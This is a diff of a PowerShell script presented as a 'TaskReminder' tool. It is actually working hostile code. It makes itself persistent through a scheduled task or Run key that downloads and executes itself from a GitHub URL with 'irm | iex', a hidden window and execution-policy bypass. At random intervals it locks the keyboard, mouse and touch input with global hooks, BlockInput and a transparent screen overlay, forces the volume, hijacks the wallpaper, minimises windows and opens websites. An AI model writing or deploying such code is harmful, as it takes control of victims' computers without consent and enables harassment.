@@ -1,103 +1,255 @@
 # ================= CONFIG =================
-$BaseUrl = "https://raw.githubusercontent.com/Kiyan-7/telaviv/main"
+$BaseUrl   = "https://raw.githubusercontent.com/Kiyan-7/telaviv/main"
+$ScriptUrl = "$BaseUrl/reminders.ps1"
 
 $Sites = @{
-    1 = "https://heavensgate.com/"
-    2 = "https://action.aipac.org/aipac-pac-donate"
-    3 = "https://www.palantir.com/platforms/gotham/"
-    4 = "https://www.idf.il/en/mini-sites/how-to-join-us-and-voluntary-programs/how-to-join/"
-    5 = "https://www.cosmic-people.com/english/default_02_obr2903_en.htm"
+    1 = "https://docs.google.com/"
+    2 = "https://slides.google.com"
+    3 = "https://wordle.com/"
+    4 = "https://newyorktimes.com/"
+    5 = "https://funnews.com"
 }
 
-$MinSeconds      = 10
-$MaxSeconds      = 120
-$Volume          = 0.5    # Windows system volume during reminders (0.0 - 1.0)
-$SetSystemVolume = $true  # set to $false to leave your system volume alone
-$AvoidRepeat     = $true
-$MinimizeAll     = $true  # minimise all windows at each reminder
-$MaxAudioWait    = 60     # never wait longer than this (seconds) for audio to finish
-$ShowConsole     = $false # set to $true when debugging (keeps the window visible)
+$MinSeconds            = 10
+$MaxSeconds            = 120
+$AvoidRepeat           = $true
+$MinimizeAll           = $true
+$ShowConsole           = $false
+
+$Volume                = 0.05
+$SetSystemVolume       = $true
+$FreezeVolume          = $true
+$MaxAudioWait          = 60
+
+$FreezeInput           = $true
+$PostSiteFreezeSeconds = 20    # STRENGTHENED: 20 seconds of locked input after site opens
+
+$TaskName              = "TaskReminder"
+$DailyStartTime        = "08:00"
+$LogonDelay            = "PT20S"
 # ==========================================
 
+# ---- Global Error Trap ----
+trap {
+    "$(Get-Date) - FATAL ERROR: $_`nLine: $($_.InvocationInfo.ScriptLineNumber)" | Out-File "$env:USERPROFILE\Desktop\TaskReminder_Error.txt" -Append
+    exit
+}
+
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$Dir = Join-Path $env:TEMP "TaskReminder"
-New-Item -ItemType Directory -Path $Dir -Force | Out-Null
+
+$Dir     = Join-Path $env:TEMP "TaskReminder"
 $LogFile = Join-Path $Dir "log.txt"
+New-Item -ItemType Directory -Path $Dir -Force | Out-Null
 
 function Log($m) {
-    "$(Get-Date -Format 'HH:mm:ss') $m" | Add-Content $LogFile
+    try { "$(Get-Date -Format 'HH:mm:ss') $m" | Add-Content $LogFile } catch {}
     if ($ShowConsole) { Write-Host $m }
 }
 
-# ---- Hide the terminal window hosting this script ----
-# (hiding keeps the program running; closing the window would end it)
-if (-not $ShowConsole) {
+function Add-Native($name, $code, $refs) {
     try {
-        Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-public class WinHide {
-    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
-    [DllImport("user32.dll")]   public static extern IntPtr GetAncestor(IntPtr hWnd, uint flags);
-    [DllImport("user32.dll")]   public static extern bool ShowWindow(IntPtr hWnd, int cmd);
-}
-"@ -ErrorAction Stop
-        $c = [WinHide]::GetConsoleWindow()
-        if ($c -ne [IntPtr]::Zero) {
-            $root = [WinHide]::GetAncestor($c, 3)    # GA_ROOTOWNER = the visible terminal window
-            if ($root -eq [IntPtr]::Zero) { $root = $c }
-            [void][WinHide]::ShowWindow($root, 0)
-            if ($root -ne $c) { [void][WinHide]::ShowWindow($c, 0) }
-            Log "Window hidden"
-        } else { Log "No console window found to hide" }
-    } catch { Log "HIDE FAILED: $($_.Exception.Message)" }
+        $p = @{ TypeDefinition = $code; ErrorAction = 'Stop' }
+        if ($refs) { $p.ReferencedAssemblies = $refs }
+        Add-Type @p
+        $true
+    } catch {
+        Log "$name SETUP FAILED: $($_.Exception.Message)"
+        $false
+    }
 }
 
-Log "--- started. Language mode: $($ExecutionContext.SessionState.LanguageMode), PS $($PSVersionTable.PSVersion), apartment: $([Threading.Thread]::CurrentThread.GetApartmentState())"
-
-# Only one copy at a time
+# ---- Only one copy at a time ----
 $mutex = New-Object System.Threading.Mutex($false, "Local\TaskReminderLoop")
 if (-not $mutex.WaitOne(0)) { Log "Already running, exiting."; exit }
-$PID | Out-File (Join-Path $Dir "pid.txt")
+$PID | Out-File (Join-Path $Dir "pid.txt") -Force
 
-# Download assets (always refreshed so old cached copies never linger)
-foreach ($i in 1..5) {
-    foreach ($f in "image$i.jpg", "audio$i.wav") {
-        $dest = Join-Path $Dir $f
-        $tmp  = "$dest.tmp"
+$CurrentUser = "$env:USERDOMAIN\$env:USERNAME"
+Log "--- started as $CurrentUser."
+
+# ---- Autostart ----
+$PsExe      = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
+$LaunchArgs = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"irm '$ScriptUrl' | iex`""
+
+$taskOk = $false
+try {
+    if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
+        $taskOk = $true
+    } else {
+        $logon = New-ScheduledTaskTrigger -AtLogOn -User $CurrentUser
+        $logon.Delay = $LogonDelay
+        Register-ScheduledTask -TaskName $TaskName -Force -ErrorAction Stop `
+            -Action    (New-ScheduledTaskAction -Execute $PsExe -Argument $LaunchArgs) `
+            -Trigger   @($logon, (New-ScheduledTaskTrigger -Daily -At $DailyStartTime)) `
+            -Settings  (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew -ExecutionTimeLimit ([TimeSpan]::Zero)) `
+            -Principal (New-ScheduledTaskPrincipal -UserId $CurrentUser -LogonType Interactive -RunLevel Limited) | Out-Null
+        $taskOk = [bool](Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)
+        Log "AUTOSTART: scheduled task created: $taskOk"
+    }
+} catch { Log "AUTOSTART TASK FAILED: $($_.Exception.Message)" }
+
+if (-not $taskOk) {
+    try {
+        $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+        Set-ItemProperty $runKey -Name $TaskName -Value "`"$PsExe`" $LaunchArgs" -ErrorAction Stop
+        Log "AUTOSTART: fell back to HKCU Run key"
+    } catch { 
+        Log "AUTOSTART RUN KEY FAILED: $($_.Exception.Message)" 
+        "Failed to set autostart!" | Out-File "$env:USERPROFILE\Desktop\TaskReminder_Error.txt" -Append
+    }
+}
+
+# ---- Downloads ----
+for ($n = 0; -not [Net.NetworkInformation.NetworkInterface]::GetIsNetworkAvailable() -and $n -lt 60; $n++) {
+    Start-Sleep -Seconds 1
+}
+
+foreach ($f in (1..5 | ForEach-Object { "image$_.jpg"; "audio$_.wav" })) {
+    $dest = Join-Path $Dir $f
+    for ($a = 1; $a -le 4; $a++) {
         try {
+            $tmp = "$dest.tmp"
             Invoke-WebRequest -UseBasicParsing "$BaseUrl/$f" -OutFile $tmp -ErrorAction Stop
             $len = (Get-Item $tmp).Length
-            if ($len -lt 1000) { throw "file is only $len bytes (not a real file?)" }
+            if ($len -lt 1000) { throw "file is only $len bytes" }
             Move-Item $tmp $dest -Force
             Log "Downloaded $f ($len bytes)"
+            break
         } catch {
-            Log "DOWNLOAD FAILED $BaseUrl/$f : $($_.Exception.Message)"
-            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
+            Log "DOWNLOAD FAILED (attempt $a/4) $f : $($_.Exception.Message)"
+            Remove-Item "$dest.tmp" -Force -ErrorAction SilentlyContinue
+            if ($a -lt 4) { Start-Sleep -Seconds (2 * $a) }
         }
     }
 }
 
-# Wallpaper support
-$wpOk = $false
-try {
-    Add-Type @"
+# ---- Wallpaper ----
+$wpOk = Add-Native "WALLPAPER" @"
 using System.Runtime.InteropServices;
 public class WP {
     [DllImport("user32.dll", CharSet=CharSet.Auto)]
     public static extern int SystemParametersInfo(int a, int b, string c, int d);
 }
-"@ -ErrorAction Stop
+"@
+if ($wpOk) {
     Set-ItemProperty "HKCU:\Control Panel\Desktop" WallpaperStyle "10"
     Set-ItemProperty "HKCU:\Control Panel\Desktop" TileWallpaper  "0"
-    $wpOk = $true
-} catch { Log "WALLPAPER SETUP FAILED: $($_.Exception.Message)" }
+}
 
-# System volume support (Windows Core Audio)
-$volOk = $false
-if ($SetSystemVolume) {
-    try {
-        Add-Type -ErrorAction Stop @"
+# ---- Input freeze ----
+$freezeOk = $FreezeInput -and (Add-Native "INPUT FREEZE" @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Threading;
+
+public class InputFreezer {
+    delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
+    [DllImport("user32.dll", SetLastError=true)] static extern IntPtr SetWindowsHookEx(int id, HookProc fn, IntPtr mod, uint tid);
+    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr h);
+    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);
+    [DllImport("user32.dll")] static extern bool BlockInput(bool block);
+    [DllImport("kernel32.dll", CharSet=CharSet.Auto)] static extern IntPtr GetModuleHandle(string name);
+    [DllImport("kernel32.dll")] static extern uint GetCurrentThreadId();
+    [DllImport("user32.dll")] static extern int GetMessage(out MSG m, IntPtr hWnd, uint min, uint max);
+    [DllImport("user32.dll")] static extern bool PostThreadMessage(uint tid, uint msg, IntPtr w, IntPtr l);
+    [StructLayout(LayoutKind.Sequential)]
+    struct MSG { public IntPtr hwnd; public uint message; public IntPtr wParam; public IntPtr lParam; public uint time; public int x; public int y; }
+
+    static HookProc kbProc = KbCallback, msProc = MsCallback;
+    static IntPtr hKb = IntPtr.Zero, hMs = IntPtr.Zero;
+    static Thread t;
+    static uint tid;
+    public static bool Ok, BlockInputOk;
+    public static int LastError;
+
+    static IntPtr KbCallback(int n, IntPtr w, IntPtr l) { return n >= 0 ? (IntPtr)1 : CallNextHookEx(hKb, n, w, l); }
+    static IntPtr MsCallback(int n, IntPtr w, IntPtr l) { return n >= 0 ? (IntPtr)1 : CallNextHookEx(hMs, n, w, l); }
+
+    public static bool Start() {
+        if (t != null) return Ok || BlockInputOk;
+        var ready = new ManualResetEvent(false);
+        Ok = false; BlockInputOk = false;
+        t = new Thread(() => {
+            tid = GetCurrentThreadId();
+            IntPtr mod = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
+            hKb = SetWindowsHookEx(13, kbProc, mod, 0);
+            if (hKb == IntPtr.Zero) LastError = Marshal.GetLastWin32Error();
+            hMs = SetWindowsHookEx(14, msProc, mod, 0);
+            if (hMs == IntPtr.Zero) LastError = Marshal.GetLastWin32Error();
+            Ok = hKb != IntPtr.Zero && hMs != IntPtr.Zero;
+            try { BlockInputOk = BlockInput(true); } catch { }
+            ready.Set();
+            if (Ok || BlockInputOk) { MSG m; while (GetMessage(out m, IntPtr.Zero, 0, 0) > 0) { } }
+            if (BlockInputOk) { try { BlockInput(false); } catch { } }
+            if (hKb != IntPtr.Zero) UnhookWindowsHookEx(hKb);
+            if (hMs != IntPtr.Zero) UnhookWindowsHookEx(hMs);
+            hKb = IntPtr.Zero; hMs = IntPtr.Zero;
+        });
+        t.IsBackground = true;
+        t.Start();
+        ready.WaitOne(3000);
+        if (!Ok && !BlockInputOk) { Stop(); return false; }
+        return true;
+    }
+
+    public static void Stop() {
+        if (t == null) return;
+        PostThreadMessage(tid, 0x0012, IntPtr.Zero, IntPtr.Zero);
+        if (!t.Join(2000)) {
+            if (hKb != IntPtr.Zero) UnhookWindowsHookEx(hKb);
+            if (hMs != IntPtr.Zero) UnhookWindowsHookEx(hMs);
+        }
+        t = null; Ok = false; BlockInputOk = false;
+    }
+}
+"@)
+
+# ---- Touch shield ----
+$shieldOk = $FreezeInput -and (Add-Native "TOUCH SHIELD" @"
+using System;
+using System.Drawing;
+using System.Runtime.InteropServices;
+using System.Threading;
+using System.Windows.Forms;
+
+public class TouchShield {
+    [DllImport("user32.dll")] static extern bool SetProcessDPIAware();
+    static Form f;
+    static Thread t;
+
+    public static void Start() {
+        if (t != null) return;
+        try { SetProcessDPIAware(); } catch { }
+        var ready = new ManualResetEvent(false);
+        t = new Thread(() => {
+            f = new Form();
+            f.FormBorderStyle = FormBorderStyle.None;
+            f.StartPosition = FormStartPosition.Manual;
+            f.Bounds = SystemInformation.VirtualScreen;
+            f.TopMost = true;
+            f.ShowInTaskbar = false;
+            f.BackColor = Color.Black;
+            f.Opacity = 0.02;
+            f.Shown += (s, e) => { ready.Set(); };
+            Application.Run(f);
+        });
+        t.SetApartmentState(ApartmentState.STA);
+        t.IsBackground = true;
+        t.Start();
+        ready.WaitOne(3000);
+    }
+
+    public static void Stop() {
+        if (t == null) return;
+        try { if (f != null && f.IsHandleCreated) f.Invoke((MethodInvoker)delegate { f.Close(); }); } catch { }
+        t.Join(2000);
+        t = null; f = null;
+    }
+}
+"@ @("System.Windows.Forms", "System.Drawing"))
+
+# ---- System volume ----
+$volOk = $SetSystemVolume -and (Add-Native "VOLUME" @"
 using System.Runtime.InteropServices;
 
 [Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
@@ -144,19 +296,70 @@ public class SysVol {
         set { Marshal.ThrowExceptionForHR(Vol().SetMute(value, System.Guid.Empty)); }
     }
 }
-"@
-        $volOk = $true
-    } catch { Log "VOLUME SETUP FAILED: $($_.Exception.Message)" }
-}
+"@)
 
-# Audio support
-$player = $null
+# ---- Audio ----
+$script:player = $null
 try {
     Add-Type -AssemblyName PresentationCore -ErrorAction Stop
-    $player = New-Object System.Windows.Media.MediaPlayer
+    $script:player = New-Object System.Windows.Media.MediaPlayer
 } catch { Log "AUDIO SETUP FAILED: $($_.Exception.Message)" }
 
-# Main loop
+# ---- Helpers ----
+$script:frozen   = $false
+$script:shielded = $false
+
+function Start-Freeze {
+    if ($freezeOk -and -not $script:frozen) {
+        try {
+            $script:frozen = [InputFreezer]::Start()
+            Log "Input freeze: $($script:frozen)"
+        } catch { Log "INPUT FREEZE ERROR: $($_.Exception.Message)" }
+    }
+    if ($shieldOk -and -not $script:shielded) {
+        try { [TouchShield]::Start(); $script:shielded = $true; Log "Touch shield on" }
+        catch { Log "TOUCH SHIELD ERROR: $($_.Exception.Message)" }
+    }
+}
+
+function Stop-Freeze {
+    if ($script:frozen)   { try { [InputFreezer]::Stop() } catch {}; $script:frozen   = $false; Log "Input released" }
+    if ($script:shielded) { try { [TouchShield]::Stop() }  catch {}; $script:shielded = $false; Log "Touch shield off" }
+}
+
+function Pin-Volume {
+    if (-not ($FreezeVolume -and $volOk)) { return }
+    try {
+        if ([SysVol]::Mute) { [SysVol]::Mute = $false }
+        if ([math]::Abs([SysVol]::Volume - $Volume) -gt 0.01) { [SysVol]::Volume = [single]$Volume }
+    } catch {}
+}
+
+function Start-Audio($n) {
+    if (-not $script:player) { return 0 }
+    $file = Join-Path $Dir "audio$n.wav"
+    try {
+        $script:player.Stop()
+        $script:player.Close()
+        $script:player = New-Object System.Windows.Media.MediaPlayer
+        $script:player.Open([Uri]$file)
+        $script:player.Volume = 1.0
+        for ($t = 0; -not $script:player.NaturalDuration.HasTimeSpan -and $t -lt 30; $t++) {
+            Start-Sleep -Milliseconds 100
+        }
+        if (-not $script:player.NaturalDuration.HasTimeSpan) { Log "AUDIO FAILED to load $file"; return 0 }
+        if ($volOk) {
+            try { [SysVol]::Mute = $false; [SysVol]::Volume = [single]$Volume }
+            catch { Log "VOLUME SET FAILED: $($_.Exception.Message)" }
+        }
+        $dur = $script:player.NaturalDuration.TimeSpan.TotalSeconds
+        $script:player.Play()
+        Log "Playing audio$n.wav ($([int]$dur)s)"
+        return [int]([math]::Min($dur + 0.5, $MaxAudioWait) * 1000)
+    } catch { Log "AUDIO FAILED: $($_.Exception.Message)"; return 0 }
+}
+
+# ---- Main loop ----
 $last = 0
 while ($true) {
     do { $x = Get-Random -Minimum 1 -Maximum 6 } while ($AvoidRepeat -and $x -eq $last)
@@ -167,61 +370,42 @@ while ($true) {
     if ($wpOk) {
         try {
             $img = Join-Path $Dir "image$x.jpg"
-            $r = [WP]::SystemParametersInfo(20, 0, $img, 3)
-            if (-not $r) { Log "Wallpaper call returned 0 for $img" }
+            if (-not [WP]::SystemParametersInfo(20, 0, $img, 3)) { Log "Wallpaper call failed" }
         } catch { Log "WALLPAPER FAILED: $($_.Exception.Message)" }
     }
 
-    # 2. Minimise all windows (show the desktop)
+    # 2. Aggressive Minimize
     if ($MinimizeAll) {
-        try {
-            (New-Object -ComObject Shell.Application).MinimizeAll()
-            Log "Minimised all windows"
-        } catch { Log "MINIMISE FAILED: $($_.Exception.Message)" }
+        try { (New-Object -ComObject Shell.Application).MinimizeAll() }
+        catch { Log "MINIMISE FAILED: $($_.Exception.Message)" }
     }
 
-    # 3. Set system volume, play audio and wait for it to finish
-    $waitMs = 0
-    if ($player) {
-        try {
-            $file = Join-Path $Dir "audio$x.wav"
-            $player.Stop()
-            $player.Close()
-            $player = New-Object System.Windows.Media.MediaPlayer
-            $player.Open([Uri]$file)
-            $player.Volume = 1.0   # full player volume; loudness is set by the system volume
+    # 3. Audio & Freeze Lockout
+    $waitMs = Start-Audio $x
+    try {
+        Start-Freeze
+        $end = (Get-Date).AddMilliseconds($waitMs)
+        
+        # Pin volume and hold input hostage during audio
+        while ((Get-Date) -lt $end) { 
+            Pin-Volume
+            Start-Sleep -Milliseconds 100 
+        }
 
-            # wait up to 3s for the file to finish loading
-            $t = 0
-            while (-not $player.NaturalDuration.HasTimeSpan -and $t -lt 30) {
+        # Open Website
+        try { Start-Process $Sites[$x] -ErrorAction Stop }
+        catch { Log "OPEN SITE FAILED: $($_.Exception.Message)" }
+
+        # Strengthened Lockout: Keep input frozen for 20 seconds AFTER the site opens
+        if ($script:frozen -or $script:shielded) { 
+            $lockoutEnd = (Get-Date).AddSeconds($PostSiteFreezeSeconds)
+            while ((Get-Date) -lt $lockoutEnd) {
+                Pin-Volume
                 Start-Sleep -Milliseconds 100
-                $t++
             }
+        }
+    } finally { Stop-Freeze }
 
-            if ($player.NaturalDuration.HasTimeSpan) {
-                if ($volOk) {
-                    try {
-                        [SysVol]::Mute   = $false
-                        [SysVol]::Volume = [single]$Volume
-                        Log "System volume set to $([int]([SysVol]::Volume * 100))%"
-                    } catch { Log "VOLUME SET FAILED: $($_.Exception.Message)" }
-                }
-                $dur = $player.NaturalDuration.TimeSpan.TotalSeconds
-                $player.Play()
-                Log "Playing audio$x.wav ($([int]$dur)s)"
-                $waitMs = [int]([math]::Min($dur + 0.5, $MaxAudioWait) * 1000)
-            } else {
-                Log "AUDIO FAILED to load $file ($((Get-Item $file -ErrorAction SilentlyContinue).Length) bytes)"
-            }
-        } catch { Log "AUDIO FAILED: $($_.Exception.Message)" }
-    }
-    if ($waitMs -gt 0) { Start-Sleep -Milliseconds $waitMs }
-
-    # 4. Open the website after the audio has finished
-    try { Start-Process $Sites[$x] -ErrorAction Stop }
-    catch { Log "OPEN SITE FAILED: $($_.Exception.Message)" }
-
+    # Random gap before next reminder
     Start-Sleep -Seconds (Get-Random -Minimum $MinSeconds -Maximum ($MaxSeconds + 1))
 }
-
-
